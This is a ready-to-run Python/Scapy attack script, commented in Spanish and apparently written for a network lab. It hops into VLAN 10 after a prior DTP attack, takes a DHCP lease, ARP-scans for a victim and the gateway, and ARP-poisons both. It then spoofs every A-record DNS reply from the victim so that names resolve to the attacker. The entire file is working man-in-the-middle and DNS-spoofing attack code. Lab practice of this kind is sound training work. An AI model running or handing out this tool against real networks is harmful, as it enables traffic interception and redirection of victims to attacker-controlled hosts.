#!/usr/bin/env python3
"""
DNS Spoofing - Lab EGALDITO_LAB
Corre DESPUÉS del script DTP.
Uso: sudo python3 dns_spoof.py
"""

import os, sys, time, signal, threading, subprocess
from scapy.all import (
    Ether,
    IP,
    ARP,
    UDP,
    DNS,
    DNSQR,
    DNSRR,
    BOOTP,
    DHCP,
    srp,
    sendp,
    sniff,
    get_if_hwaddr,
    conf,
)

IFACE = "eth0"
SUBIF = "eth0.10"
VLAN = 10

state = {
    "my_ip": None,
    "gw_ip": None,
    "gw_mac": None,
    "vic_ip": None,
    "vic_mac": None,
    "stop": threading.Event(),
}


# ══════════════════════════════════════════════
# PASO 1 — Subinterfaz VLAN 10
# ══════════════════════════════════════════════
def create_subif():
    print(f"\n[*] Creando subinterfaz {SUBIF} (VLAN {VLAN})...")
    subprocess.run(["ip", "link", "delete", SUBIF], capture_output=True)
    time.sleep(0.5)
    subprocess.run(
        [
            "ip",
            "link",
            "add",
            "link",
            IFACE,
            "name",
            SUBIF,
            "type",
            "vlan",
            "id",
            str(VLAN),
        ]
    )
    subprocess.run(["ip", "link", "set", IFACE, "up"])
    subprocess.run(["ip", "link", "set", SUBIF, "up"])

    print(f"[*] Esperando que {SUBIF} esté disponible...")
    for i in range(15):
        r = subprocess.run(
            ["ip", "link", "show", SUBIF], capture_output=True, text=True
        )
        if "LOWER_UP" in r.stdout:
            time.sleep(1)
            conf.ifaces.reload()
            conf.route.resync()
            from scapy.arch import get_if_list

            if SUBIF in get_if_list():
                print(f"[+] {SUBIF} lista y reconocida por Scapy.")
                return
            else:
                print(f"[!] Kernel OK pero Scapy no la ve. Reintentando...")
        elif SUBIF in r.stdout:
            print(
                f"    ({i + 1}/15) existe pero sin LOWER_UP (trunk no negociado aún)..."
            )
        else:
            print(f"    ({i + 1}/15) esperando...")
        time.sleep(1)

    print(f"\n[-] {SUBIF} no subió correctamente.")
    print(f"    → Verifica: ip link show {IFACE}")
    sys.exit(1)


# ══════════════════════════════════════════════
# PASO 2 — DHCP completo (Discover→Offer→Request→ACK)
# ══════════════════════════════════════════════
def get_ip_dhcp():
    print(f"\n[*] Iniciando intercambio DHCP completo en {SUBIF}...")
    my_mac = get_if_hwaddr(SUBIF)
    mac_bytes = bytes.fromhex(my_mac.replace(":", "")).ljust(16, b"\x00")
    xid = 0x12345678

    offered = [None]
    gateway = [None]
    server_id = [None]
    assigned = [None]

    # ── 1. Discover ──────────────────────────
    discover = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, chaddr=mac_bytes, xid=xid)
        / DHCP(
            options=[
                ("message-type", "discover"),
                ("param_req_list", [1, 3, 6, 15]),
                "end",
            ]
        )
    )
    print("[*] Enviando DHCP Discover...")
    sendp(discover, iface=SUBIF, verbose=False)

    # ── 2. Capturar Offer ────────────────────
    def catch_offer(pkt):
        if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
            return
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type" and opt[1] == 2:
                offered[0] = pkt[BOOTP].yiaddr
                for o in pkt[DHCP].options:
                    if isinstance(o, tuple):
                        if o[0] == "router":
                            gateway[0] = o[1]
                        if o[0] == "server_id":
                            server_id[0] = o[1]
                print(f"[+] DHCP Offer → IP: {offered[0]}   GW: {gateway[0]}")

    sniff(
        iface=SUBIF,
        filter="udp port 68",
        prn=catch_offer,
        stop_filter=lambda _: offered[0] is not None,
        timeout=8,
    )

    if not offered[0]:
        print("[-] No se recibió DHCP Offer. Posibles causas:")
        print("    1) Trunk no negociado  → corre el script DTP primero")
        print("    2) R1 sin pool DHCP    → verifica 'show ip dhcp pool' en R1")
        print(f"   Diagnóstico: tcpdump -i {SUBIF} port 67 or port 68 -n")
        sys.exit(1)

    # ── 3. Request ───────────────────────────
    print(f"[*] Enviando DHCP Request para {offered[0]}...")
    request = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, chaddr=mac_bytes, xid=xid)
        / DHCP(
            options=[
                ("message-type", "request"),
                ("requested_addr", offered[0]),
                ("server_id", server_id[0] or gateway[0]),
                ("param_req_list", [1, 3, 6, 15]),
                "end",
            ]
        )
    )
    sendp(request, iface=SUBIF, verbose=False)

    # ── 4. Capturar ACK ──────────────────────
    def catch_ack(pkt):
        if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
            return
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type" and opt[1] == 5:
                assigned[0] = pkt[BOOTP].yiaddr
                for o in pkt[DHCP].options:
                    if isinstance(o, tuple) and o[0] == "router":
                        gateway[0] = o[1]
                print(f"[+] DHCP ACK → IP: {assigned[0]}   GW: {gateway[0]}")

    sniff(
        iface=SUBIF,
        filter="udp port 68",
        prn=catch_ack,
        stop_filter=lambda _: assigned[0] is not None,
        timeout=8,
    )

    if not assigned[0]:
        print("[-] Offer recibido pero no llegó el ACK.")
        sys.exit(1)

    # ── Aplicar IP a la interfaz ─────────────
    subprocess.run(["ip", "addr", "flush", "dev", SUBIF], capture_output=True)
    subprocess.run(["ip", "addr", "add", f"{assigned[0]}/24", "dev", SUBIF])
    subprocess.run(
        ["ip", "route", "add", "default", "via", gateway[0], "dev", SUBIF],
        capture_output=True,
    )

    # Recargar rutas en Scapy
    conf.route.resync()

    state["my_ip"] = assigned[0]
    state["gw_ip"] = gateway[0]
    print(f"[+] Kali → IP: {state['my_ip']}   GW: {state['gw_ip']}")


# ══════════════════════════════════════════════
# PASO 3 — ARP: descubrir víctima y gateway MAC
# ══════════════════════════════════════════════
def resolve_mac_direct(target_ip):
    """ARP Request directo sin depender del routing del sistema."""
    my_mac = get_if_hwaddr(SUBIF)
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(
        op=1,
        hwsrc=my_mac,
        psrc=state["my_ip"],
        hwdst="00:00:00:00:00:00",
        pdst=target_ip,
    )
    ans, _ = srp(pkt, iface=SUBIF, timeout=3, verbose=False)
    if ans:
        return ans[0][1][ARP].hwsrc
    return None


def discover_hosts():
    prefix = ".".join(state["my_ip"].split(".")[:3])
    network = f"{prefix}.0/24"
    print(f"\n[*] ARP Scan en {network}...")

    my_mac = get_if_hwaddr(SUBIF)
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(
        op=1, hwsrc=my_mac, psrc=state["my_ip"], hwdst="00:00:00:00:00:00", pdst=network
    )
    ans, _ = srp(pkt, iface=SUBIF, timeout=3, verbose=False)

    hosts = []
    for _, r in ans:
        ip = r[ARP].psrc
        mac = r[ARP].hwsrc
        if ip == state["my_ip"]:
            continue
        if ip == state["gw_ip"]:
            state["gw_mac"] = mac
            print(f"    [GATEWAY]  {ip}  {mac}")
        else:
            print(f"    [HOST]     {ip}  {mac}")
            hosts.append({"ip": ip, "mac": mac})

    # Si gateway no respondió al scan, intentar ARP directo
    if not state["gw_mac"]:
        print(
            f"[*] Gateway no respondió al scan, intentando ARP directo a {state['gw_ip']}..."
        )
        mac = resolve_mac_direct(state["gw_ip"])
        if mac:
            state["gw_mac"] = mac
            print(f"[+] Gateway: {state['gw_ip']}  {mac}")
        else:
            print(f"[-] Gateway {state['gw_ip']} no responde. Verifica R1.")
            sys.exit(1)

    if not hosts:
        print("[*] Sin víctimas en el scan. Entrando en modo pasivo...")
        discover_passive()
        return

    if len(hosts) == 1:
        state["vic_ip"] = hosts[0]["ip"]
        state["vic_mac"] = hosts[0]["mac"]
    else:
        print("\n[?] Múltiples hosts. Elige la víctima:")
        for i, h in enumerate(hosts):
            print(f"    {i}) {h['ip']}  {h['mac']}")
        idx = int(input("Número: "))
        state["vic_ip"] = hosts[idx]["ip"]
        state["vic_mac"] = hosts[idx]["mac"]

    print(f"[+] Víctima: {state['vic_ip']}  {state['vic_mac']}")


def discover_passive():
    print("[*] Esperando tráfico ARP pasivo (30s)...")

    def handler(pkt):
        if pkt.haslayer(ARP) and pkt[ARP].op == 1:
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc
            if ip not in (state["my_ip"], state["gw_ip"], "0.0.0.0"):
                state["vic_ip"] = ip
                state["vic_mac"] = mac
                print(f"[+] Host detectado: {ip}  {mac}")

    sniff(
        iface=SUBIF,
        filter="arp",
        prn=handler,
        stop_filter=lambda _: state["vic_ip"] is not None,
        timeout=30,
    )

    if not state["vic_ip"]:
        print("[-] No se detectó víctima. Abortando.")
        sys.exit(1)


# ══════════════════════════════════════════════
# PASO 4 — ARP Poisoning
# ══════════════════════════════════════════════
def arp_loop():
    atk = get_if_hwaddr(SUBIF)
    while not state["stop"].is_set():
        sendp(
            Ether(dst=state["vic_mac"])
            / ARP(
                op=2,
                pdst=state["vic_ip"],
                hwdst=state["vic_mac"],
                psrc=state["gw_ip"],
                hwsrc=atk,
            ),
            iface=SUBIF,
            verbose=False,
        )
        sendp(
            Ether(dst=state["gw_mac"])
            / ARP(
                op=2,
                pdst=state["gw_ip"],
                hwdst=state["gw_mac"],
                psrc=state["vic_ip"],
                hwsrc=atk,
            ),
            iface=SUBIF,
            verbose=False,
        )
        time.sleep(2)


def restore_arp():
    print("[*] Restaurando tablas ARP...")
    for _ in range(5):
        sendp(
            Ether(dst=state["vic_mac"])
            / ARP(
                op=2,
                pdst=state["vic_ip"],
                hwdst=state["vic_mac"],
                psrc=state["gw_ip"],
                hwsrc=state["gw_mac"],
            ),
            iface=SUBIF,
            verbose=False,
        )
        sendp(
            Ether(dst=state["gw_mac"])
            / ARP(
                op=2,
                pdst=state["gw_ip"],
                hwdst=state["gw_mac"],
                psrc=state["vic_ip"],
                hwsrc=state["vic_mac"],
            ),
            iface=SUBIF,
            verbose=False,
        )
        time.sleep(0.2)
    print("[+] ARP restaurado.")


# ══════════════════════════════════════════════
# PASO 5 — DNS Spoofing
# ══════════════════════════════════════════════
def dns_handler(pkt):
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
        return
    if not pkt.haslayer(IP) or pkt[IP].src != state["vic_ip"]:
        return
    if pkt[DNSQR].qtype != 1:
        return

    qname = pkt[DNSQR].qname.decode(errors="ignore")
    print(f"[DNS] {state['vic_ip']} pregunta: {qname.rstrip('.')}  → {state['my_ip']}")

    sendp(
        Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
        / IP(src=pkt[IP].dst, dst=pkt[IP].src)
        / UDP(sport=53, dport=pkt[UDP].sport)
        / DNS(
            id=pkt[DNS].id,
            qr=1,
            aa=1,
            qd=pkt[DNS].qd,
            an=DNSRR(rrname=qname, type="A", ttl=60, rdata=state["my_ip"]),
        ),
        iface=SUBIF,
        verbose=False,
    )


# ══════════════════════════════════════════════
# LIMPIEZA (Ctrl+C)
# ══════════════════════════════════════════════
def cleanup(sig=None, frame=None):
    print("\n[!] Deteniendo...")
    state["stop"].set()
    time.sleep(1)
    if state["vic_mac"] and state["gw_mac"]:
        restore_arp()
    open("/proc/sys/net/ipv4/ip_forward", "w").write("0")
    print("[+] Listo.")
    sys.exit(0)


# ══════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════
if os.geteuid() != 0:
    sys.exit("Ejecutar como root: sudo python3 dns_spoof.py")

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

print("=" * 45)
print("  DNS Spoof - Lab EGALDITO_LAB")
print("  (corre después del script DTP)")
print("=" * 45)

create_subif()
get_ip_dhcp()
discover_hosts()

open("/proc/sys/net/ipv4/ip_forward", "w").write("1")
print("[+] IP Forwarding ON")

threading.Thread(target=arp_loop, daemon=True).start()
print(f"[+] ARP Poison activo: {state['vic_ip']} ↔ {state['gw_ip']}")
time.sleep(3)

print(f"\n[+] Escuchando DNS de {state['vic_ip']}... (Ctrl+C para salir)\n")
sniff(
    iface=SUBIF,
    filter=f"udp port 53 and src host {state['vic_ip']}",
    prn=dns_handler,
    store=False,
    stop_filter=lambda _: state["stop"].is_set(),
)
